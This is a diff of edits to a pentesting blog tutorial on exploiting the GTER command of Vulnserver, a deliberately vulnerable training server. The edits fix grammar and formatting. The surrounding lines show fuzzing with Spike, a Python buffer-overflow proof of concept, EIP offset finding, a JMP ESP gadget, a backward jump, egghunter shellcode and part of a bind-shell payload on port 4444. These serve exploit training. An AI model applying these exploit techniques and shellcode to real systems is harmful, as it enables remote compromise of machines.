@@ -5,7 +5,7 @@
 :tags: challenge, ethical hacking, pentesting, security, training, exploit
 :image: cover.png
 :alt: Photo by Pel on Unsplash
-:description: Vulnserver is a VbD application focused to help people practice the exploiting skills. This post will describe the steps taken to exploit the GTER command. This post describes a technique called "Egghunting" used when there are space restrictions for our exploitation.
+:description: Vulnserver is a VbD application focused on helping people practice exploiting skills. This post will describe the steps taken to exploit the GTER command. Besides, it will outline a technique called 'Egghunting,' used when there are space restrictions for our exploitation.
 :keywords: Bussiness, Information, Security, Protection, Hacking, Exploit, OSCE
 :author: Andres Roldan
 :writer: aroldan
@@ -16,23 +16,23 @@
 
 = Vulnserver GTER Exploitation
 
-As we saw on the link:../vulnserver-trun/[previous post], vulnserver is a
-VbD (Vulnerable-by-Design) application that was designed to help you
-sharpen the Windows exploitation skills.
+As we saw in the link:../vulnserver-trun/[previous post],
+vulnserver is a `VbD` (Vulnerable-by-Design) application
+designed to help you sharpen the Windows exploitation skills.
 
 Our link:../vulnserver-trun/[previous post] described the exploitation
-of TRUN command using a simple EIP overwrite technique, as we had
-virtually no constrains for our payload. However, exploiting the
-GTER command will not be as straightforward.
+of `TRUN` command using a simple `EIP` overwrite technique, as we had
+virtually no constraints for our payload. However, exploiting the
+`GTER` command will not be as straightforward.
 
-WARNING: Do NOT run `vulnserver.exe` on a sensitive machine or on
-a non-secure network.
+WARNING: Do NOT run `vulnserver.exe` on a sensitive machine
+or a non-secure network.
 It will be a backdoor that may be used by others to break into your system.
 
 == Enumerating Vulnserver
 
-If you launch `vulnserver.exe` with no options, the default used port will
-be *TCP/9999*.
+If you launch `vulnserver.exe` with no options,
+the default port used will be *TCP/9999*.
 
 image::vulnserver1.png[vulnserver]
 
@@ -45,14 +45,14 @@ Ok, it's fuzz time.
 
 == Fuzzing GTER
 
-As we did with the `TRUN` command before, we now know the syntax needed for
-the `GTER` command. And again,
-we'll be using link:https://github.com/guilhermeferreira/spikepp[Spike]
+As we did before with the `TRUN` command,
+we now know the syntax needed for the `GTER` command.
+And again, we'll be using link:https://github.com/guilhermeferreira/spikepp[Spike]
 to help us with our fuzzing.
 
-As `GTER` uses a similar syntax as the `TRUN` command, we can reuse
-the Spike script created in our previous post and just change the
-command
+As `GTER` uses a similar syntax to the `TRUN` command,
+we can reuse the Spike script created in our previous post
+and just change the command.
 
 .gter.spk
 [source,c]
@@ -61,20 +61,20 @@ s_string("GTER ");
 s_string_variable("*");
 ----
 Remember that the `s_string` command will send an immutable string to
-the fuzzed protocol and `s_string_variable` tells `Spike` to use
+the fuzzed protocol, and `s_string_variable` tells `Spike` to use
 that string as a fuzz point.
 
 Now we can send the fuzz attack to the victim machine:
 
 image::fuzz1.gif[Running spike]
 
-Ugh! After a few iterations `vulnserver.exe` crashed and it seems
+Ugh! After a few iterations, `vulnserver.exe` crashed, and it seems
 that it happened when we sent 5060 bytes of data.
 Let's check the offending payload on `Wireshark`:
 
 image::wireshark1.png[Wireshark capture]
 
-We can now create a PoC (Proof-of-Concept) file with that information:
+We can now create a `PoC` (Proof-of-Concept) file with that information:
 
 .exploit.py
 [source,python]
@@ -105,23 +105,23 @@ Look at that! We replicated the crash!
 image::crash1.png[Controlling EIP]
 
 Look at the state of the application at the moment of the crash.
-The first thing to notice is that the EIP register has the value `41414141`
+The first thing to notice is that the `EIP` register has the value `41414141`,
 which means that we effectively overwrote it with our buffer of `A`.
-That's good news. However if you see in the stack window (bottom right),
-we only have 20 bytes after the ESP pointer, so if we do a `JMP ESP`, we
-will only have 20 bytes for working. That's simply not enough space for
-anything complex.
+That's good news. However, if you see in the stack window (bottom right),
+we only have 20 bytes after the `ESP` pointer, so if we do a `JMP ESP`,
+we will only have 20 bytes for working.
+That's not enough space for anything complex.
 
 However, if we look at the dump window (bottom left), we have a broader
-space (around 0x90 or 144 bytes) at the beggining of our buffer, which
-is again not enough for something like a reverse shell, so we need to
+space (around 0x90 or 144 bytes) at the beginning of our buffer, which
+is again not enough for something like a reverse shell, so, we need to
 be creative here. Actually, we can fit a reverse shell in that space,
 but we need to carve it manually by reusing already loaded `WinSock`
 modules of `vulnserver`, but that will be part of another post.
 
-First things first.
+First things first:
 
-We need to calculate the exact offset on which EIP gets overwritten.
+We need to calculate the exact offset on which `EIP` gets overwritten.
 To do that, we will use `pattern_create.rb` from `Metasploit` to create a
 cyclic pattern.
 
@@ -158,8 +158,8 @@ And we run the exploit again:
 
 image::offset1.png[Exploit: take 2]
 
-This time, EIP has the value `41396541`. Let's check
-the offset on our cyclic pattern:
+This time, `EIP` has the value `41396541`.
+Let's check the offset on our cyclic pattern:
 
 .Running pattern_offset.rb
 [source,bash]
@@ -169,7 +169,7 @@ $ msf-pattern_offset -q 41396541
 [*] Exact match at offset 147
 ----
 
-Great, that tells us that the EIP gets overwritten starting on the *147*
+Great, that tells us that the `EIP` gets overwritten starting on the *147*
 byte of our buffer. Update the exploit to check the offset:
 
 .exploit.py
@@ -192,8 +192,8 @@ with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
-Now run the exploit. If EIP gets the value `42424242` which are the
-four bytes of our `B` buffer, we got it right:
+Now run the exploit. If `EIP` gets the value `42424242`,
+which are the four bytes of our `B` buffer, we got it right:
 
 image::offset2.png[Correct offset to EIP]
 
@@ -202,7 +202,7 @@ Whoohooo! Now we can start exploiting this.
 == Exploiting
 
 If we check the state of the application after the crash, we can see that
-we can jump to ESP to gain control of the execution flow.
+we can jump to `ESP` to gain control of the execution flow.
 
 We can use `mona.py` plugin to find that instruction:
 
@@ -212,8 +212,8 @@ We can use `mona.py` plugin to find that instruction:
 ! mona jmp -r esp -o -cp nonull
 ----
 
-This will tell `mona` to look for the instruction `JMP ESP` and will
-exclude DLL from the OS.
+This will tell `mona` to look for the instruction `JMP ESP`
+and will exclude `DLL` from the `OS`.
 
 image::mona1.png[JMP ESP]
 
@@ -249,42 +249,42 @@ image::jmp1.gif[Performing the JMP ESP]
 
 Great!
 
-But like everything can't be so glorious, we landed on our
-`C` buffer which contains 20 bytes.
-We need to move to the `A` buffer which holds
-around 144 bytes to work.
+But since everything can't be so glorious,
+we landed on our `C` buffer, which contains 20 bytes.
+We need to move to the `A` buffer,
+which holds around 144 bytes to work.
 
 == Jump around
 
-To get around of this space constrain, we need to jump to our bigger
-buffer.
+To get around this space constraint,
+we need to jump to our bigger buffer.
 
 For jumping, we can use the unconditional jump instruction found in
 X86 architecture called `JMP` that will divert the execution flow
 to the desired address. We also need to know where to jump.
 
-Now look at the next image which is the resulting location after
-our `JMP ESP` execution:
+Now look at the next image,
+which is the resulting location after our `JMP ESP` execution:
 
 image::jmp1.png[Location of our execution flow]
 
 As we can see, we are in the next instruction after the `JMP ESP`
-at the address `00CBF9C8` (This is a stack address so it will change
-everytime we run the application), and we see that we have only
+at the address `00CBF9C8` (this is a stack address, so it will change
+every time we run the application), and we see that we have only
 20 bytes to work.
 
-If we scroll up, we can see that the buffer of `A`, starts at
-`00CBF931`:
+If we scroll up,
+we can see that the buffer of `A` starts at `00CBF931`:
 
 image::jmp2.png[Start of buffer]
 
-So we need to do a relative jump backwards. Using the debugger, we can
+So we need to do a relative jump backward. Using the debugger, we can
 easily calculate the offset:
 
-image::jmp3.gif[Relative backwards jump]
+image::jmp3.gif[Relative backward jump]
 
-As you can see, the resulting bytes are `E9 64 FF FF FF`. Let's update
-our exploit with that jump:
+As you can see, the resulting bytes are `E9 64 FF FF FF`.
+Let's update our exploit with that jump:
 
 .exploit.py
 [source,python]
@@ -315,19 +315,19 @@ And check the result:
 image::jmp4.gif[Jumped back]
 
 Great! We were able to jump to the start of our buffer.
-But what now? On 147 bytes it's hard to include a working reverse shell.
+But what now? On 147 bytes, it's hard to include a working reverse shell.
 However, there's a trick we can use that will have to do with eggs.
 
 == Egghunter
 
-An egghunter is a little shellcode (commonly around 32 bytes) that can
-be injected on our payload.
-It's an special shellcode because it will not execute anything, but also
-will search the entire memory for the location of the desired code
-and once it's found, it will be executed.
+An 'egghunter' is a little shellcode (commonly around 32 bytes)
+that can be injected on our payload.
+It's a special shellcode because it will not execute just anything
+but will search the entire memory for the location of the desired code,
+and once it finds it, it will execute it.
 
 But how will it know what to execute? It will look for a tag that
-will be prepended to our shellcode, also called the `egg` and once
+will be prepended to our shellcode, also called the `egg`, and once
 it find that `egg`, it will execute any code that follows.
 
 First, we need to create our egghunter shellcode:
@@ -343,8 +343,8 @@ EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 ----
 
 Note that the configured egg is `w00t`. However, to make the
-searching more effective, that egghunter was designed to  look for
-a double instance of that tag, that means `w00tw00t`.
+searching more effective, that egghunter was designed to look for
+a double instance of that tag, which means `w00tw00t`.
 This will make the execution of the shellcode more effective.
 
 Let's update our exploit:
@@ -383,12 +383,12 @@ What will happen is the following:
 
 . Our buffer will be injected.
 . The `JMP ESP` will be executed.
-. Next the backwards jump will be executed and land directly to our
-egghunter.
-. The egghunter will iterate through all the memory looking for
-the tag `w00tw00t`.
-. When the egghunter finds the tag, it will execute anything that
-follows that tag.
+. The backward jump will be executed
+and land directly to our egghunter.
+. The egghunter will iterate through all the memory
+looking for the tag `w00tw00t`.
+. When the egghunter finds the tag,
+it will execute anything that follows that tag.
 
 So, the only thing that's missing is our shellcode. We will create one
 that will bind a shell on port `4444`:
@@ -439,10 +439,10 @@ SHELL += b"\x2c\xf4\xce\x22\xcd\x03\xce\x47\xc8\x48\x48\xb4"
 SHELL += b"\xa0\xc1\x3d\xba\x17\xe1\x17"
 ----
 
-But where can we fit it? This shellcode is 355 bytes long but we only
-have 140 bytes as much to work.
+But where can we fit it? This shellcode is 355 bytes long,
+but we only have 140 bytes as much to work.
 
-We have to think out of the box: `Vulnserver` is a server (really!) and it
+We have to think out of the box: `Vulnserver` is a server (really!), and it
 will surely multiplex connections. Well, we can create a different connection
 to send the shellcode over! This will store it on memory where our
 egghunter will be able to find it.
